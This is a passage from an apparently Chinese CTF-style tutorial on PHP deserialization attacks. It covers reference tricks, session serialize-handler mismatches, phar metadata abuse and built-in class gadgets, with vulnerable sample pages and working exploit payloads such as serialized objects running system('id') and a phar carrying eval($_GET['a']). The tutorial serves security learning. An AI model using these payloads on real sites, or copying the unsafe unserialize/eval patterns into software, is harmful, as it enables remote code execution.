<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'pass'</span>])) {</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">'pass'</span>];</span><br><span class="line">    <span class="variable">$pass</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">'*'</span>,<span class="string">'\*'</span>,<span class="variable">$pass</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$o</span>) {</span><br><span class="line">    <span class="variable">$o</span>-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.<span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>POC</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">just4fun</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; enter = &amp;<span class="variable">$a</span> -&gt;secret;  <span class="comment">//引用赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}*/</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户 session被序列化以后，存储到指定目录(默认为/tmp) 。</p>
<p> 存取数据的格式有多种，常用的有三种 </p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711001241276.png" alt="image-20240711001241276"></p>
<p>1.php</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'benben'</span>] = <span class="variable">$_GET</span>[<span class="string">'ben'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?ben=dazhuang</span><br><span class="line"></span><br><span class="line">benben | s:8:"dazhuang";</span><br></pre></td></tr></tbody></table></figure>

<p>2.php_serialize</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'benben'</span>] = <span class="variable">$_GET</span>[<span class="string">'ben'</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'b'</span>] = <span class="variable">$_GET</span>[<span class="string">'b'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?benben=dazhuang&amp;b=666</span><br><span class="line"></span><br><span class="line"> a:2:{s:6:"benben";s:8:"dazhuang";s:1:"b";s:3:"666";}</span><br></pre></td></tr></tbody></table></figure>

<p>3.php_binary</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_binary'</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'benben'</span>] = <span class="variable">$_GET</span>[<span class="string">'ben'</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'b'</span>] = <span class="variable">$_GET</span>[<span class="string">'b'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?benben=dazhuang&amp;b=666</span><br><span class="line"></span><br><span class="line">06benbens:8:"dazhuang";01bs:3:"666";</span><br></pre></td></tr></tbody></table></figure>



<p>漏洞产生：当网站序列化存储session与反序列化并读取session的方式不同，就可能导致session反序列化漏洞反的产生</p>
<p>示例1：</p>
<p>提交session</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'ben'</span>] = <span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>漏洞页面</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">'session.serialize_handler'</span>,<span class="string">'php'</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>=<span class="string">"system('id');"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:1:"D":1:{s:1:"a";s:13:"system('id');";}</span></span><br></pre></td></tr></tbody></table></figure>

<p>在第一个界面提交</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?a=|O:1:"D":1:{s:1:"a";s:13:"system('id');";}</span><br></pre></td></tr></tbody></table></figure>

<p>转存储为</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">a:1:{s:3:"ben";s:42:"|O:1:"D":1:{s:1:"a";s:13:"system('id');";}</span><br></pre></td></tr></tbody></table></figure>

<p>然后被以php方式读取时只会将|后面的内容反序列化</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">O:1:"D":1:{s:1:"a";s:13:"system('id');";}</span><br></pre></td></tr></tbody></table></figure>

<p>示例2</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));<span class="comment">//这里还是运用到引用赋值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her){</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>hint.php</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'a'</span>] = <span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;name = &amp;<span class="variable">$a</span> -&gt;her;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:4:"Flag":2:{s:4:"name";N;s:3:"her";R:2;}</span></span><br><span class="line"><span class="comment">//?a=|O:4:"Flag":2:{s:4:"name";N;s:3:"her";R:2;}</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p><strong>什么是Phar</strong></p>
<p>PHp ARchive, like a Java JAR, but for PHP.</p>
<p>phar（PHp ARchive）是类似于JAR的一种打包文件。PHP ≥5.3对Phar后缀文件是默认开启支持的，不需要任何其他的安装就可以使用它。</p>
<p>phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。</p>
<p>说白了，就是一种压缩文件，但是不止能放压缩文件进去。</p>
<p>在做进一步探究之前需要先调整配置，因为对于Phar文件的相关操作，php缺省状态是只读的（也就是说单纯使用Phar文件不需要任何的调整配置）。但是因为我们现在需要创建一个自己的Phar文件，所以需要允许写入Phar文件，这需要修改一下 <code>php.ini</code></p>
<p>打开 <code>php.ini</code>，找到 <code>phar.readonly</code> 指令行，修改成：</p>
<figure class="highlight ini"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">phar.readonly</span> = <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>



<p>Phar文件主要包含三至四个部分：</p>
<ol>
<li>a stub</li>
</ol>
<p>stub的基本结构：**<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，**前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<ol start="2">
<li>a manifest describing the contents</li>
</ol>
<p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711013413352.png" alt="image-20240711013413352"></p>
<ol start="3">
<li>the file contents</li>
</ol>
<p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p>
<ol start="4">
<li>a signature for verifying Phar integrity</li>
</ol>
<p>签名格式</p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711013358813.png" alt="image-20240711013358813"></p>
<p><strong>Phar漏洞原理</strong></p>
<p>manifest压缩文件的属性等信息，以序列化存储；存在一段序列化的字符串；</p>
<p>调用phar伪协议，可读取phar文件；</p>
<p>phar文件解析时会自动触发对manifest字段的序列化字符串进行反序列化</p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711013325897.png" alt="image-20240711013325897"></p>
<p>生成phar</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">''</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">'test.phar'</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">'test.phar'</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Testobj</span>();  <span class="comment">//可修改</span></span><br><span class="line"><span class="variable">$o</span>-&gt;output=<span class="string">'eval($_GET["a"]);'</span>;   <span class="comment">//可修改</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>漏洞界面</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">"echo 'ok';"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;output);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'filename'</span>]))</span><br><span class="line">{</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>));</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>Phar使用条件</p>
<p>phar文件能上传到服务器；</p>
<p>要拥有可用的反序列化魔术方法作为跳板；</p>
<p>要有文件操作函数</p>
<p>文件操作函数参数可控</p>
<p>例题</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>)){</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>upload.php是一个上传点</p>
<p>exp</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">'test.phar'</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">'test.phar'</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">TestObject</span>();  <span class="comment">//可修改</span></span><br><span class="line"><span class="comment">//$o-&gt;output='eval($_GET["a"]);';   //可修改</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>生成phar文件，改个jpg后缀</p>
<p>在漏洞页面</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST:file=phar://upload/test.jpg</span><br></pre></td></tr></tbody></table></figure>



<h3 id="原生类反序列化"><a href="#原生类反序列化" class="headerlink" title="原生类反序列化"></a>原生类反序列化</h3><p>在php中除了php内置函数还有很多内置类，这些内置类可以和内置函数一样调用。</p>
<p>看一下php内置类中可用的魔术方法</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();  <span class="comment">// 返回由已定义类的名字所组成的数组</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) {</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);  <span class="comment">// 返回由类的方法名组成的数组</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'__destruct'</span>,</span><br><span class="line">            <span class="string">'__toString'</span>,</span><br><span class="line">            <span class="string">'__wakeup'</span>,</span><br><span class="line">            <span class="string">'__call'</span>,</span><br><span class="line">            <span class="string">'__callStatic'</span>,</span><br><span class="line">            <span class="string">'__get'</span>,</span><br><span class="line">            <span class="string">'__set'</span>,</span><br><span class="line">            <span class="string">'__isset'</span>,</span><br><span class="line">            <span class="string">'__unset'</span>,</span><br><span class="line">            <span class="string">'__invoke'</span>,</span><br><span class="line">            <span class="string">'__set_state'</span></span><br><span class="line">        ))) {</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">'::'</span> . <span class="variable">$method</span> . <span class="string">";"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Exception::__wakeup;Exception::__toString;</span><br><span class="line">ErrorException::__wakeup;ErrorException::__toString;</span><br><span class="line">Error::__wakeup;Error::__toString;</span><br><span class="line">CompileError::__wakeup;CompileError::__toString;</span><br><span class="line">ParseError::__wakeup;ParseError::__toString;</span><br><span class="line">TypeError::__wakeup;TypeError::__toString;</span><br><span class="line">ArgumentCountError::__wakeup;ArgumentCountError::__toString;</span><br><span class="line">ArithmeticError::__wakeup;ArithmeticError::__toString;</span><br><span class="line">DivisionByZeroError::__wakeup;DivisionByZeroError::__toString;</span><br><span class="line"></span><br><span class="line">Generator::__wakeup;</span><br><span class="line">ClosedGeneratorException::__wakeup;ClosedGeneratorException::__toString;</span><br><span class="line">DateTime::__wakeup;DateTime::__set_state;</span><br><span class="line">DateTimeImmutable::__wakeup;DateTimeImmutable::__set_state;</span><br><span class="line">DateTimeZone::__wakeup;DateTimeZone::__set_state;</span><br><span class="line">DateInterval::__wakeup;DateInterval::__set_state;</span><br><span class="line">DatePeriod::__wakeup;DatePeriod::__set_state;</span><br><span class="line"></span><br><span class="line">JsonException::__wakeup;JsonException::__toString;</span><br><span class="line">LogicException::__wakeup;LogicException::__toString;</span><br><span class="line">BadFunctionCallException::__wakeup;BadFunctionCallException::__toString;</span><br><span class="line">BadMethodCallException::__wakeup;BadMethodCallException::__toString;</span><br><span class="line">DomainException::__wakeup;DomainException::__toString;</span><br><span class="line">InvalidArgumentException::__wakeup;InvalidArgumentException::__toString;</span><br><span class="line">LengthException::__wakeup;LengthException::__toString;</span><br><span class="line">OutOfRangeException::__wakeup;OutOfRangeException::__toString;</span><br><span class="line">RuntimeException::__wakeup;RuntimeException::__toString;</span><br><span class="line">OutOfBoundsException::__wakeup;OutOfBoundsException::__toString;</span><br><span class="line">OverflowException::__wakeup;OverflowException::__toString;</span><br><span class="line">RangeException::__wakeup;RangeException::__toString;</span><br><span class="line">UnderflowException::__wakeup;UnderflowException::__toString;</span><br><span class="line">UnexpectedValueException::__wakeup;UnexpectedValueException::__toString;</span><br><span class="line"></span><br><span class="line">CachingIterator::__toString;</span><br><span class="line">RecursiveCachingIterator::__toString;</span><br><span class="line"></span><br><span class="line">SplFileInfo::__toString;</span><br><span class="line">DirectoryIterator::__toString;</span><br><span class="line">FilesystemIterator::__toString;</span><br><span class="line">RecursiveDirectoryIterator::__toString;</span><br><span class="line">GlobIterator::__toString;</span><br><span class="line">SplFileObject::__toString;</span><br><span class="line">SplTempFileObject::__toString;</span><br><span class="line"></span><br><span class="line">SplFixedArray::__wakeup;</span><br><span class="line"></span><br><span class="line">ReflectionException::__wakeup;ReflectionException::__toString;</span><br><span class="line"></span><br><span class="line">ReflectionFunctionAbstract::__toString;</span><br><span class="line">ReflectionFunction::__toString;</span><br><span class="line"></span><br><span class="line">ReflectionParameter::__toString;</span><br><span class="line">ReflectionType::__toString;</span><br><span class="line">ReflectionNamedType::__toString;</span><br><span class="line">ReflectionMethod::__toString;</span><br><span class="line">ReflectionClass::__toString;</span><br><span class="line">ReflectionObject::__toString;</span><br><span class="line">ReflectionProperty::__toString;</span><br><span class="line">ReflectionClassConstant::__toString;</span><br><span class="line">ReflectionExtension::__toString;</span><br><span class="line">ReflectionZendExtension::__toString;</span><br><span class="line"></span><br><span class="line">AssertionError::__wakeup;AssertionError::__toString;</span><br><span class="line"></span><br><span class="line">DOMException::__wakeup;DOMException::__toString;</span><br><span class="line"></span><br><span class="line">PDOException::__wakeup;PDOException::__toString;</span><br><span class="line">PDO::__wakeup;</span><br><span class="line">PDOStatement::__wakeup;</span><br><span class="line"></span><br><span class="line">SimpleXMLElement::__toString;</span><br><span class="line">SimpleXMLIterator::__toString;</span><br><span class="line"></span><br><span class="line">CURLFile::__wakeup;</span><br><span class="line"></span><br><span class="line">mysqli_sql_exception::__wakeup;mysqli_sql_exception::__toString;</span><br><span class="line"></span><br><span class="line">PharException::__wakeup;PharException::__toString;</span><br><span class="line">Phar::__destruct;Phar::__toString;</span><br><span class="line">PharData::__destruct;PharData::__toString;</span><br><span class="line">PharFileInfo::__destruct;PharFileInfo::__toString;</span><br></pre></td></tr></tbody></table></figure>

<h4 id="1-遍历目录"><a href="#1-遍历目录" class="headerlink" title="1.遍历目录"></a>1.遍历目录</h4><p>（1）**<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.directoryiterator.php">Directorylterator</a><strong>和</strong><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.filesystemiterator.php">Filesystemlterator</a>**</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Directorylterator(PHP 5, PHP 7, PHP 8)</span><br><span class="line">Filesystemlterator(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</span><br></pre></td></tr></tbody></table></figure>

<p>查看官方文档可以知道Filesystemlterator继承于Directorylterator</p>
<p>两者的作用和用法基本相同，区别在于Filesystemlterator会显示文件的完整路径，而Directorylterator只会显示文件名</p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711165621846.png" alt="image-20240711165621846"></p>
<p>分析一下Directorylterator类摘要</p>
